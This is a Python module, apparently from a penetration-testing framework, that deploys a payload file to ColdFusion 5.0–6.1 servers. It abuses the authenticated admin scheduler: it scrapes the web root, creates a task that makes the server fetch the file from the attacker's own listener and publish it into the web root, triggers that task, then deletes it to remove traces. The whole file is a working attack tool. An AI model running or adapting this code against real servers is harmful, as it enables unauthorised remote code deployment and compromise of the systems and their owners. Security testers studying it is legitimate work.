from src.platform.coldfusion.interfaces import CINTERFACES
from src.platform.coldfusion.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, parse_war_path, killServe
from threading import Thread
from os.path import abspath
from re import findall
from time import sleep
from log import LOG
import utility
import state


title = CINTERFACES.CFM
versions = ['5.0', '6.0', '6.1']
def deploy(fingerengine, fingerprint):
	""" Scheduled Task deployer for older versions; radically different
	than newer systems, so it warrants its own deployer.
	"""

	cfm_path = abspath(fingerengine.options.deploy)
	cfm_file = parse_war_path(cfm_path, True)
	dip = fingerengine.options.ip

	cookie = checkAuth(dip, fingerprint.port, title, fingerprint.version)[0]
	if not cookie:
		utility.Msg("Could not get auth", LOG.ERROR)
		return

	utility.Msg("Preparing to deploy {0}...".format(cfm_file))
	utility.Msg("Fetching web root...", LOG.DEBUG)

	root = fetch_webroot(dip, fingerprint, cookie)
	if not root:
		utility.Msg("Unable to fetch web root.", LOG.ERROR)
		return
	
	# create the scheduled task
	utility.Msg("Web root found at %s" % root, LOG.DEBUG)
	utility.Msg("Creating scheduled task...")

	if not create_task(dip, fingerprint, cfm_file, root, cookie):
		return

	# invoke the task
	utility.Msg("Task %s created, invoking..." % cfm_file)
	run_task(dip, fingerprint, cfm_path, cookie)

	# cleanup
	utility.Msg("Cleaning up...")
	if not delete_task(dip, fingerprint, cfm_file, cookie):
		utility.Msg("Failed to remove task.  May require manual removal.", LOG.ERROR)


def create_task(ip, fingerprint, cfm_file, root, cookie):
	""" Generate a new task; all parameters are necessary, unfortunately
	"""

	base = "http://{0}:{1}".format(ip, fingerprint.port)
	uri = '/CFIDE/administrator/scheduler/scheduleedit.cfm'

	if fingerprint.version in ['5.0']:
		data = {
			"taskNameOrig" : "",
			"TaskName" : cfm_file,
			"StartDate" : "01/01/2020",
			"EndDate" : "",
			"ScheduleType" : "Once",
			"StartTimeOnce" : "13:24:05",
			"Interval" : "Daily",
			"StartTimeDWM" : "",
			"customInterval" : "0",
			"CustomStartTime" : "",
			"CustomEndTime" : "",
			"Operation" : "HTTPRequest",
			"Port" : state.external_port,
			"ScheduledURL" : "http://{0}/{1}".format(utility.local_address(), cfm_file),
			"Username" : "",
			"Password" : "",
			"RequestTimeout" : "10",
			"ProxyServer" : "",
			"HttpProxyPort" : "23",
			"Publish" : "1",
			"filePath" : root,
			"File" : cfm_file.replace('cfml', 'cfm'),
			"adminsubmit" : "Submit+Changes"
		}

	else:
		data = {
			"TaskName" : cfm_file,
			"Start_Date" : "Jan 2, 2020",
			"End_Date" : "",
			"ScheduleType" : "Once",
			"StartTimeOnce" : "13:24:50",
			"Interval" : "Daily",
			"StartTimeDWM" : "",
			"customInterval_hour" : "0",
			"customInterval_min" : "0",
			"customInterval_sec" : "0",
			"CustomStartTime" : "",
			"CustomEndTime" : "",
			"Operation" : "HTTPRequest",
			"ScheduledURL" : "http://{0}:{1}/{2}".format(utility.local_address(), 
											state.external_port, cfm_file),
			"Username" : "",
			"Password" : "",
			"Request_Time_out" : "",
			"proxy_server" : "",
			"http_proxy_port" : "",
			"publish" : "1",
			"publish_file" : root + "\\" + cfm_file,
			"adminsubmit" : "Submit",
			"taskNameOrig" : ""

		}

	response = utility.requests_post(base+uri, data=data, cookies=cookie)
	if response.status_code is 200:

		return True


def run_task(ip, fingerprint, cfm_path, cookie):
	""" Invoke the task and wait for the server to fetch it
	"""

	success = False
	cfm_file = parse_war_path(cfm_path, True)

	# start up our listener
	server_thread = Thread(target=_serve, args=(cfm_path,))
	server_thread.start()
	sleep(2)

	base = 'http://{0}:{1}'.format(ip, fingerprint.port)

	if fingerprint.version in ['5.0']:
		uri = '/CFIDE/administrator/scheduler/runtask.cfm?task=%s' % cfm_file
	else:
		uri = '/CFIDE/administrator/scheduler/scheduletasks.cfm?runtask=%s'\
																% cfm_file

	response = utility.requests_get(base + uri, cookies=cookie)
	if waitServe(server_thread):
		if fingerprint.version in ['5.0']:
			out_diag = "{0} deployed to /{0}".format(cfm_file.replace('cfml','cfm'))
		else:
			out_diag = "{0} deployed to /CFIDE/{0}".format(cfm_file)

		utility.Msg(out_diag, LOG.SUCCESS)
		success = True

	killServe()
	return success


def delete_task(ip, fingerprint, cfm_file, cookie):
	"""
	"""

	base = 'http://{0}:{1}'.format(ip, fingerprint.port)
	uri = '/CFIDE/administrator/scheduler/deletetask.cfm'
	data = {
		"deletesubmit" : "Yes",
		"task" : cfm_file
	}

	response = utility.requests_post(base + uri, data=data, cookies=cookie)
	if response.status_code is 200:
		return True


def fetch_webroot(ip, fingerprint, cookie):
	""" Fetch the webroot for the CF server; this is where our
	payload is stashed
	"""

	base = "http://{0}:{1}".format(ip, fingerprint.port)

	if fingerprint.version in ['5.0']:
		uri = "/CFIDE/administrator/server_settings/mappings.cfm?mapname=/"
	else:
		uri = '/CFIDE/administrator/settings/mappings.cfm?mapname=/CFIDE'

	response = utility.requests_get(base+uri, cookies=cookie)
	if response.status_code is 200:

		if fingerprint.version in ['5.0']:
			data = findall("name=\"DirectoryPath\" value=\"(.*?)\"",
													response.content)
			if data and len(data) > 0:
				data = data[0]
		else:
			data = findall("<td nowrap><font class=\"label\">&nbsp; (.*?) &nbsp;",
																 response.content)
			if data and len(data) > 0:
				data = data[1]

		if data:
			return data